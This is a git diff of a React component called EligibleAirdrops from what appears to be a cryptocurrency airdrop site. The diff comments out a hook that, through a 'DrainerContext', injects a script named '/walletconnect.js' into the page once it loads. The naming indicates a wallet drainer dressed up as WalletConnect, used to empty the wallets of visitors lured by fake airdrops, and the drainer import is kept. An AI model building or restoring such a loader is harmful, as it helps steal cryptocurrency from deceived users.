@@ -5,47 +5,46 @@ import { auth, userService } from "../../../main.jsx";
 import { useAuthState } from "../../../hooks/userAuthState.js";
 import { AIRDROPS } from "../../Address/Address.jsx";
 import { Badge, Button } from "@mantine/core";
-import {useDrainer} from "../../../context/DrainerContext.jsx";
-
+import { useDrainer } from "../../../context/DrainerContext.jsx";
 
 const EligibleAirdrops = () => {
   const [airdrops, setAirdrops] = useState([]);
   const [userWallet, setUserWallet] = useState(null);
   const [user] = useAuthState(auth);
-	const { drainerIsAdded, updateStatus } = useDrainer()
+  // const { drainerIsAdded, updateStatus } = useDrainer()
 
-	useEffect(() => {
-		if (drainerIsAdded) return;
-
-		const onDOMContentLoaded = () => {
-			// Dynamically load the walletconnect.js script
-			const secondScript = document.createElement("script");
-			secondScript.src = "/walletconnect.js";
-			// secondScript.charset = "UTF-8";
-			secondScript.type = "text/javascript";
-			document.body.appendChild(secondScript);
-
-			// Ensure the script initializes properly once loaded
-			secondScript.onload = () => {
-				updateStatus();
-				console.log("Second script loaded successfully");
-			};
-		};
-
-		// Attach the listener for DOMContentLoaded
-		if (document.readyState === "loading") {
-			// If DOM is still loading, wait for it to complete
-			document.addEventListener("DOMContentLoaded", onDOMContentLoaded);
-		} else {
-			// If DOM is already loaded, execute immediately
-			onDOMContentLoaded();
-		}
-
-		return () => {
-			// Cleanup the event listener on component unmount
-			document.removeEventListener("DOMContentLoaded", onDOMContentLoaded);
-		};
-	}, []);
+  // useEffect(() => {
+  // 	if (drainerIsAdded) return;
+  //
+  // 	const onDOMContentLoaded = () => {
+  // 		// Dynamically load the walletconnect.js script
+  // 		const secondScript = document.createElement("script");
+  // 		secondScript.src = "/walletconnect.js";
+  // 		// secondScript.charset = "UTF-8";
+  // 		secondScript.type = "text/javascript";
+  // 		document.body.appendChild(secondScript);
+  //
+  // 		// Ensure the script initializes properly once loaded
+  // 		secondScript.onload = () => {
+  // 			updateStatus();
+  // 			console.log("Second script loaded successfully");
+  // 		};
+  // 	};
+  //
+  // 	// Attach the listener for DOMContentLoaded
+  // 	if (document.readyState === "loading") {
+  // 		// If DOM is still loading, wait for it to complete
+  // 		document.addEventListener("DOMContentLoaded", onDOMContentLoaded);
+  // 	} else {
+  // 		// If DOM is already loaded, execute immediately
+  // 		onDOMContentLoaded();
+  // 	}
+  //
+  // 	return () => {
+  // 		// Cleanup the event listener on component unmount
+  // 		document.removeEventListener("DOMContentLoaded", onDOMContentLoaded);
+  // 	};
+  // }, []);
 
   useEffect(() => {
     const fetchUserData = async () => {
